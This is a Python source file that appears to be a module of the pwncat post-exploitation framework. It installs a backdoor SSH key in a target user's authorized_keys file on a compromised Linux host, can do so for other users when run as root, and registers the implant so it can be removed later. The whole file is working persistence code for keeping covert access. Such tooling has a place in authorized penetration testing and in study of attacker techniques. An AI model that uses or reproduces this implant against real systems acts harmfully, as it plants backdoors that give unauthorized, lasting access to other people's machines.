#!/usr/bin/env python3
import os
import pathlib

import pwncat
from pwncat.facts import PrivateKey
from pwncat.modules import Status, Argument, ModuleFailed
from pwncat.platform.linux import Linux
from pwncat.modules.implant import ImplantModule


class AuthorizedKeyImplant(PrivateKey):
    """A public key added to a user's authorized keys file"""

    def __init__(self, source, user, key, pubkey):
        super().__init__(
            source=source,
            path=key,
            uid=user.id,
            content=pathlib.Path(key).read_text(),
            encrypted=False,
            authorized=True,
        )

        self.pubkey = pubkey

    def title(self, session: "pwncat.manager.Session"):
        """Provide a human-readable description"""
        user = session.find_user(uid=self.uid)
        return f"backdoor public key added to [blue]{user.name}[/blue] authorized_keys"

    def description(self, session: "pwncat.manager.Session"):
        """We don't want to print the whole key, since we installed it."""
        return None

    def remove(self, session: "pwncat.manager.Session"):
        """Normal private key facts don't remove the key, but we need to. In this
        case the fact is removed as well, unlike a standard private key fact."""

        current_user = session.current_user()
        user = session.find_user(uid=self.uid)

        if current_user.id != self.uid and current_user.id != 0:
            raise ModuleFailed(f"must be root or {user.name}")

        # Ensure the directory exists
        homedir = session.platform.Path(user.home)
        if not (homedir / ".ssh").is_dir():
            return

        authkeys_path = homedir / ".ssh" / "authorized_keys"

        if not authkeys_path.is_file():
            return

        try:
            with authkeys_path.open("r") as filp:
                authkeys = [line for line in filp.readlines() if line != self.pubkey]
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        try:
            with authkeys_path.open("w") as filp:
                filp.writelines(authkeys)
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        # Fix permissions (in case the file was replaced by the above write)
        session.platform.chown(str(authkeys_path), user.id, user.gid)
        authkeys_path.chmod(0o600)


class Module(ImplantModule):
    """
    Install the custom backdoor key-pair as an authorized key for
    the specified user. This method only succeeds for a user other
    than the current user if you are currently root.
    """

    PLATFORM = [Linux]
    ARGUMENTS = {
        **ImplantModule.ARGUMENTS,
        "user": Argument(
            str,
            default="__pwncat_current__",
            help="the user for which to install the implant (default: current user)",
        ),
        "key": Argument(str, help="path to keypair which will be added for the user"),
    }

    def install(self, session: "pwncat.manager.Session", user, key):

        yield Status("verifying user permissions")
        current_user = session.current_user()
        if user != "__pwncat_current__" and current_user.id != 0:
            raise ModuleFailed("only root can install implants for other users")

        if not os.path.isfile(key):
            raise ModuleFailed(f"private key {key} does not exist")

        try:
            yield Status("reading public key")
            with open(key + ".pub", "r") as filp:
                pubkey = filp.read().rstrip("\n") + "\n"
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        # Parse user name (default is current user)
        if user == "__pwncat_current__":
            user_info = current_user
        else:
            user_info = session.find_user(name=user)

        # Ensure the user exists
        if user_info is None:
            raise ModuleFailed(f"user [blue]{user}[/blue] does not exist")

        # Ensure we haven't already installed for this user
        for implant in session.run("enumerate", types=["implant.*"]):
            if implant.source == self.name and implant.uid == user_info.uid:
                raise ModuleFailed(
                    f"{self.name} already installed for {user_info.name}"
                )

        # Ensure the directory exists
        yield Status("locating authorized keys")
        homedir = session.platform.Path(user_info.home)
        if not (homedir / ".ssh").is_dir():
            (homedir / ".ssh").mkdir(parents=True, exist_ok=True)

        authkeys_path = homedir / ".ssh" / "authorized_keys"

        if authkeys_path.is_file():
            try:
                yield Status("reading authorized keys")
                with authkeys_path.open("r") as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                raise ModuleFailed(str(exc)) from exc
        else:
            authkeys = []

        # Add the public key to authorized keys
        authkeys.append(pubkey)

        try:
            yield Status("patching authorized keys")
            with authkeys_path.open("w") as filp:
                filp.writelines(authkeys)
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        # Ensure correct permissions
        yield Status("fixing authorized keys permissions")
        session.platform.chown(str(authkeys_path), user_info.id, user_info.gid)
        authkeys_path.chmod(0o600)

        return AuthorizedKeyImplant(self.name, user_info, key, pubkey)
